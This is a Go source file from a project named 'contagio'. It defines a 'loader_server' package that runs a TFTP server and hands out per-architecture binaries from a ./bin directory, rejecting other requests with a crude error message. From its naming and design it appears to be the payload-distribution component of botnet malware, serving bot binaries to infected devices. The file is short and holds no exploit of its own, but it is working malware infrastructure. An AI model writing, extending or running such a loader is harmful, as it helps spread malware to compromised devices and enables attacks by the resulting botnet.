package loader_server

import (
	"contagio/contagio/config"
	"contagio/contagio/config/logging"
	"errors"
	"fmt"
	"io"
	"os"
	"time"

	"github.com/pin/tftp/v3"
)

func StartTftp(config *config.Config) {

	s := tftp.NewServer(Sendtftp, nil)
	s.SetTimeout(5 * time.Second)

	logging.PrintInfo("Tftp server ready: " + config.TftpServer)
	err := s.ListenAndServe(config.TftpServer)
	if err != nil {
		logging.PrintError("Tftp fatal error: " + err.Error())
		config.Wg.Done()
		return
	}
}

func Sendtftp(filename string, rf io.ReaderFrom) error {
	checkpath := func() bool {
		for _, i := range Archs {
			if "./bin/"+i == filename {
				return true
			}
		}
		return false
	}()

	if !checkpath {
		return errors.New("fuck u")

	}

	file, err := os.Open(filename)
	if err != nil {
		return err
	}

	_, err = rf.ReadFrom(file)
	if err != nil {
		return err
	}

	if !config.Disable_Debug {
		logging.PrintInfo(fmt.Sprintf("[tftp] %s sent\n", filename))
	}

	return nil
}
